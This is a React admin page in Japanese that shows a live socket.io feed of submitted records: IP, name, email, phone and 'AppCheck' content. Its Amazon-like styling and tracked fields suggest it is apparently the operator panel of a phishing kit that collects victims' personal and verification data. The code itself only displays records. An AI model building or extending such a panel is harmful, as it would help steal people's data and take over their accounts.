import { useEffect, useMemo, useState } from 'react';
import { socket } from '../socket';

type RecordRow = {
  id: number | string;
  ip: string;
  time: string;
  fullname?: string;
  email?: string;
  telephone?: string;
  page?: string;
  online?: boolean;
  status?: string;
  appCheck?: string;
  updatedAt?: number;
};

export default function AppCheck() {
  const [records, setRecords] = useState<RecordRow[]>([]);

  useEffect(() => {
    socket.connect();
    socket.emit('join-admin');

    socket.on('admin-update', (data: any) => {
      if (Array.isArray(data?.records)) setRecords(data.records);
    });

    return () => {
      socket.off('admin-update');
      socket.disconnect();
    };
  }, []);

  const rows = useMemo(() => {
    return [...records].sort((a, b) => {
      const aid = parseFloat(String(a.id)) || 0;
      const bid = parseFloat(String(b.id)) || 0;
      if (bid !== aid) return bid - aid;
      return (b.updatedAt || 0) - (a.updatedAt || 0);
    });
  }, [records]);

  return (
    <div className="alz-page">
      <div className="alz-shell">
        <div className="alz-top">
          <div className="flex items-center justify-between gap-2">
            <div>
              <div className="alz-badge">管理</div>
              <h1 className="mt-2 text-xl font-bold tracking-wide">AppCheck 確認キュー</h1>
            </div>
            <div className="text-xs text-[#b9c5dc]">リアルタイム管理フィード</div>
          </div>
        </div>

        <div className="alz-card">
          <div className="alz-section-eyebrow">記録</div>
          <h2 className="mt-2 text-2xl font-extrabold text-[#0f1111]">送信された AppCheck データ</h2>
          <p className="mt-2 text-sm text-[#565959]">`admin-update` で送られてくる最新記録を表示しています。</p>

          <div className="mt-5 overflow-x-auto rounded-xl border border-[#d5d9d9] bg-white">
            <table className="min-w-[1200px] w-full text-sm">
              <thead className="bg-[#f7fafa] border-b border-[#d5d9d9]">
                <tr className="text-[#565959]">
                  <th className="px-4 py-3 text-left w-32">ID</th>
                  <th className="px-4 py-3 text-left w-44">時刻</th>
                  <th className="px-4 py-3 text-left w-44">IP</th>
                  <th className="px-4 py-3 text-left w-44">氏名</th>
                  <th className="px-4 py-3 text-left w-56">メール</th>
                  <th className="px-4 py-3 text-left w-44">電話番号</th>
                  <th className="px-4 py-3 text-left min-w-[520px]">AppCheck 内容</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[#eaeded]">
                {rows.length === 0 ? (
                  <tr>
                    <td colSpan={7} className="py-14 text-center text-[#565959]">
                      まだ記録がありません。`admin-update` を待機中です。
                    </td>
                  </tr>
                ) : (
                  rows.map((r) => (
                    <tr key={String(r.id)} className="hover:bg-[#fcfcfc] align-top">
                      <td className="px-4 py-3 font-mono text-[#007185]">{r.id}</td>
                      <td className="px-4 py-3 font-mono text-[#0f1111]">{r.time}</td>
                      <td className="px-4 py-3 font-mono text-[#565959]">{r.ip || '-'}</td>
                      <td className="px-4 py-3">{r.fullname || '-'}</td>
                      <td className="px-4 py-3 font-mono break-all">{r.email || '-'}</td>
                      <td className="px-4 py-3 font-mono break-all">{r.telephone || '-'}</td>
                      <td className="px-4 py-3">
                        <div className="font-mono whitespace-pre-wrap break-words text-[#0f1111]">{r.appCheck || '-'}</div>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}
